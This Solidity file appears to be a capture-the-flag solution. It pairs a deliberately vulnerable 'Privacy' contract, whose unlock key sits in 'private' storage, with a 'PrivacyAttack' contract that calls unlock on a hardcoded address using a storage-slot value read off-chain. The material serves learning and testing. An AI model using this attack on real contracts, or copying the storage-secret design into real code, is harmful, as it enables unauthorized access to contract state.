// SPDX-License-Identifier: MIT
pragma solidity 0.5;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(now);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) public {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}

contract PrivacyAttack {
    Privacy targetContract;

    constructor() public {
        targetContract = Privacy(0x2bd319d4da541B01DDd8835c83E2667E419F314b);
    }

    function unlock(bytes32 _slotValue) external {
        bytes16 key = bytes16(_slotValue);
        targetContract.unlock(key);
    }
}
